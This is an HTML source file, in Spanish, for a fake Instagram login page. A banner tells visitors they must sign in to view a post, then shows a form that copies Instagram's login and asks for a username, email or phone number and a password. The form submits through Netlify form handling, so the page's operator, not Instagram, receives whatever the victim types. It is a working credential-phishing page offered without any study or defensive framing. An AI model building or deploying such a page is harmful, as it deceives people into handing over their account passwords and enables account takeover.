<!DOCTYPE html>
<html>
<head>
	<link rel="stylesheet" type="text/css" href="estilos.css">
	<title>Iniciar sesión • Instagram</title>
	<link rel="shortcut icon" href="imagenes/instagram-logo.png"/>
	<script src="https://kit.fontawesome.com/a076d05399.js"></script>
   	<link rel="stylesheet" type="text/css" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.1/css/all.min.css">
    	<meta name="viewport" content="width=device-width, initial-scale=1.0">
	<meta http-equiv=”Content-Type” content=”text/html; charset=UTF-8″>
</head>
<body>

<div id="bienvenida">
	<h1>Debes iniciar sessión a Instagram desde Google para poder ver esta publicación</h1>
	<button onclick="ocultar();" id='boton_ocultar'>Ver Publicación</button>
</div>

	<div id="contenedor">

		<div id="contenedor_formulario">
			<div id="div_formulario">

				<img src="imagenes/instagram-texto.png">

        <form class='form_contact' method='post' name='contacto' data-netlify="true" netlify>

        	<input type="text" name="correo" id="email" placeholder="Teléfono, usuario o Correo electrónico" required><br>
        	<input type="password" name="contraseña" id="contraseña" placeholder="Contraseña" required>
        	<br>
        	<br>
            <input type="submit" value="Iniciar sesión" id="btnSend">
        </form>

        <p id="ov">¿Olvidaste tu contraseña?</p>
    </div>
</div>

		<div id="formulario_abajo">
			<p>¿No tienes una cuenta?<b> <a href="">Regístrate</a></p></b>
		</div>			
	</div>

	<script type="text/javascript">
		function ocultar(){
			document.getElementById('contenedor').style.display='block';
			document.getElementById('bienvenida').style.display='none';
		}
	</script>
</body>
</html>
